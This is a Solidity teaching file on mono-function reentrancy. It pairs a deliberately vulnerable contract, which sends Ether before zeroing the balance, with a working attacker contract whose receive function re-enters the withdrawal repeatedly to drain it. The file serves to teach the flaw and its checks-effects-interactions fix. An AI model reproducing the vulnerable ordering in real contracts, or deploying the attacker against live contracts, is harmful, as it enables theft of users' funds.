// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

/**
 * @notice type 1 MONO-FUNCTION REENTRANCY
 * see contract #45 Reentrancy Ether for type 2 and 3
 *
 * 1. UNEXPECTED ACTION: Exploitation of state variables through a callback function
 * 2. BEST PRACTICE: use CEI not CIE 
 * - Manipulation: victim state (balance)
 *
 * - Exploited cycle (victim)
 * 1) check user's (attacker) balance
 * 2) send funds (and create a time window)
 * 3) update the user's (attacker) balance
 *
 * - Exploiter cycle (attacker)
 * 1) asks victim to transfer funds to him (witdraw)
 * 2) victim starts its exploited cycle
 * 3) attacker receives its funds
 * 4) between Victim's point 2) and 3), the attacker balance is still positive
 * so he's eligible to withdraw again
 * 5) he exploits the fact that a call function will default to a receive/fallback function:
 * he calls another withdraw inside that callback function to keep withdrawing funds
 *
 */
contract ReentrancyVictim {
    error ReentrancyVictim_balanceIsLow();
    error ReentrancyVictim_callFailed();

    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAllMyDeposit() public {
        // this is called to withdraw All Users' deposit
        uint256 userBalance = balances[msg.sender];
        // 1) Check
        if (userBalance == 0) {
            revert ReentrancyVictim_balanceIsLow();
        }
        // 2) Interacion
        (bool success,) = msg.sender.call{value: userBalance}(""); //this triggers the fallback function in the receiver
        if (!success) {
            revert ReentrancyVictim_callFailed();
        }
        // 3) Effect
        balances[msg.sender] = 0;
    }
}

contract ReentrancyAttacker {
    ReentrancyVictim immutable victim;

    error ReentrancyAttacker_sendingNotEnoughEthers();

    constructor(address _victim) {
        victim = ReentrancyVictim(_victim);
    }

    function attack() external payable {
        if (
            msg.value < 0.1 ether //
        ) revert ReentrancyAttacker_sendingNotEnoughEthers();
        victim.deposit{value: msg.value}();
        victim.withdrawAllMyDeposit(); // calls a receive / fallback
    }

    //this can also be fallback, but victim.withdraw does not have a calldata
    receive() external payable {
        if (address(victim).balance >= msg.value) {
            // it drains until the last drop!
            victim.withdrawAllMyDeposit();
        }
    }
}
